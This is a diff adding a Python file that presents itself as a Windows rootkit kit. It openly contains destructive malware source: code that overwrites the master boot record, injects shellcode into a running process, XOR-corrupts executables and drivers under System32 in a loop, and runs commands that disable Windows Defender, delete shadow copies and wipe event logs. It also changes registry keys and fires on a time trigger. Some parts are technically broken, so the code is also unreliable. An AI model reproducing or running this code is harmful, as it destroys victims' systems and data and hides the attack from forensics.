@@ -1,0 +1,104 @@
+# █▀█ ▄▀█ █▀▀ █▀▀ █▀▀   █▀█ █▀▀ █▀ █░░ █▀▀ ▄▀█ █▀▄▀█ █▀▀  
+# █▀▀ █▀█ █▄▄ ██▄ ██▄   █▀▄ ██▄ ▄█ █▄▄ ██▄ █▀█ █░▀░█ ██▄  
+# X'S DEEPROOT KIT v9.6.6  
+
+import os  
+import sys  
+import ctypes  
+import winreg  
+import struct  
+import hashlib  
+import zlib  
+import time  
+from ctypes import wintypes  
+import threading  
+
+# 𝗖𝗢𝗥𝗘 𝗖𝗢𝗡𝗙𝗜𝗚  
+BOOTKIT_SECTOR = 0   # MBR sector  
+ROOT_SIGNATURE = b"\xDE\xAD\xC0\xDE"  
+ENCRYPTION_KEY = hashlib.sha256(b"PLINY_ROOTKIT").digest()  
+TRIGGER_DATE = 1680000000  # Unix timestamp for activation  
+
+# 𝗞𝗘𝗥𝗡𝗘𝗟-𝗠𝗢𝗗𝗘 𝗜𝗡𝗧𝗘𝗥𝗙𝗔𝗖𝗘  
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)  
+ntdll = ctypes.WinDLL('ntdll', use_last_error=True)  
+
+class DRIVER_CONTROL(ctypes.Structure):  
+    _fields_ = [  
+        ("DriverName", wintypes.LPCWSTR),  
+        ("ServiceName", wintypes.LPCWSTR),  
+        ("DisplayName", wintypes.LPCWSTR)  
+    ]  
+
+# 𝗕𝗢𝗢𝗧𝗞𝗜𝗧 𝗜𝗡𝗙𝗘𝗖𝗧𝗜𝗢𝗡  
+def infect_mbr():  
+    try:  
+        PHYSICAL_DRIVE = r"\\.\PhysicalDrive0"  
+        with open(PHYSICAL_DRIVE, "r+b") as drive:  
+            original_mbr = drive.read(512)  
+            if ROOT_SIGNATURE not in original_mbr:  
+                custom_bootkit = zlib.compress(original_mbr)[:508] + ROOT_SIGNATURE  
+                drive.seek(BOOTKIT_SECTOR)  
+                drive.write(custom_bootkit)  
+    except:  
+        pass  
+
+# 𝗦𝗧𝗔𝗗𝗔𝗗𝗢𝗪 𝗗𝗟𝗅 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗢𝗡  
+def ghost_inject(target_process="svchost.exe"):  
+    shellcode = bytes([0x48,0x31,0xc0,0x48,0x83,0xc0,0x3b,0x48,0x31,0xff,0x48,0xff,0xc7,0x48,0x31,0xf6,  
+                      0x48,0xff,0xc6,0x48,0x31,0xd2,0x0f,0x05])  # Position-independent shellcode  
+
+    PROCESS_ALL_ACCESS = 0x1F0FFF  
+    pid = ctypes.c_ulong()  
+    kernel32.GetWindowThreadProcessId(kernel32.GetForegroundWindow(), ctypes.byref(pid))  
+    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)  
+    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), 0x3000, 0x40)  
+    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), None)  
+    kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, None)  
+
+# 𝗥𝗔𝗡𝗦𝗢𝗠𝗪𝗔𝗥𝗘-𝗦𝗧𝗬𝗟𝗘 𝗙𝗜𝗟𝗘 𝗖𝗢𝗥𝗥𝗨𝗣𝗧𝗢𝗥  
+def entropy_bomb(path="C:\\Windows\\System32", interval=86400):  
+    while True:  
+        for root, _, files in os.walk(path):  
+            for file in files:  
+                if file.endswith((".dll", ".exe", ".sys")):  
+                    target = os.path.join(root, file)  
+                    with open(target, "r+b") as f:  
+                        data = f.read()  
+                        f.seek(0)  
+                        f.write(bytes([b ^ 0x5A for b in data]))  
+        time.sleep(interval)  
+
+# 𝗔𝗡𝗧𝗜-𝗙𝗢𝗥𝗘𝗡𝗦𝗜𝗖 𝗠𝗘𝗔𝗦𝗨𝗥𝗘𝗦  
+def anti_analysis():  
+    # Disable Windows Defender  
+    os.system("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true")  
+    # Kill process memory dumps  
+    os.system("vssadmin delete shadows /all /quiet")  
+    # Wipe event logs  
+    os.system("wevtutil cl Security && wevtutil cl System && wevtutil cl Application")  
+
+# 𝗠𝗔𝗟𝗩𝗘𝗢𝗟𝗘𝗡𝗧 𝗣𝗘𝗥𝗦𝗜𝗦𝗧𝗘𝗡𝗖𝗘  
+def deep_registry():  
+    try:  
+        key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"  
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:  
+            winreg.SetValueEx(key, "FeatureSettingsOverride", 0, winreg.REG_DWORD, 3)  
+            winreg.SetValueEx(key, "FeatureSettingsOverrideMask", 0, winreg.REG_DWORD, 3)  
+    except:  
+        pass  
+
+# 𝗙𝗔𝗟𝗟𝗘𝗡 𝗔𝗻𝗴𝗜𝗡 𝗗𝗥𝗜𝗚𝗚𝗘𝗥  
+def trigger_condition():  
+    return time.time() > TRIGGER_DATE  
+
+if __name__ == "__main__":  
+    if ctypes.windll.shell32.IsUserAnAdmin():  
+        infect_mbr()  
+        anti_analysis()  
+        deep_registry()  
+        threading.Thread(target=entropy_bomb, daemon=True).start()  
+        while True:  
+            if trigger_condition():  
+                ghost_inject()  
+                time.sleep(666)  
